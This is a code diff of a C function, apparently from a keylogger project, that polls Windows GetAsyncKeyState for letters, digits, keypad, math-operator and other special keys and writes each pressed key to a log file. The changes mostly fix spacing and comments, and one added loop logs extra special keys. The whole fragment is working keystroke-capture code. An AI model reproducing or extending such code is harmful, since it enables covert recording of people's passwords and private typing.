@@ -78,12 +78,12 @@ void log_keyboard_state( FILE * log_file )
 			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
 			{
 				// Put the character in capital letter if necessary
-				int ascii = ( is_cap ? i : (i+32) );
+				int ascii = ( is_cap ? i : ( i+32 ) );
 				log_infos( log_file, "%c", ascii );
 			}
 		}
 		
-		// Numeric keys
+		// Numeric keys (can be special keys)
 		for( i = VK_0; i <= VK_9; i++ )
 		{
 			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
@@ -99,6 +99,7 @@ void log_keyboard_state( FILE * log_file )
 			}
 		}
 		
+		// Numeric keys (keypad)
 		for( i = VK_NUMPAD0; i <= VK_NUMPAD9; i++ )
 		{
 			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
@@ -116,7 +117,7 @@ void log_keyboard_state( FILE * log_file )
 			}
 		}
 		
-		// Mathematics operators keys
+		// Mathematical operators keys
 		for( i = 0; i < NB_VKS_MATH; i++ )
 		{
 			if( GetAsyncKeyState( VKS_MATH[i] ) & KEY_PRESSED_STATE )
@@ -125,7 +126,14 @@ void log_keyboard_state( FILE * log_file )
 			}
 		}
 		
-		
+		// Others keys considered as importants
+		for( i = 0; i < NB_VKS_OTHERS; i++ )
+		{
+			if( GetAsyncKeyState( VKS_OTHERS[i] ) & KEY_PRESSED_STATE )
+			{
+				log_infos( log_file, "%s", VKS_OTHERS_TXT[i] );
+			}
+		}		
 		
 	}
 }
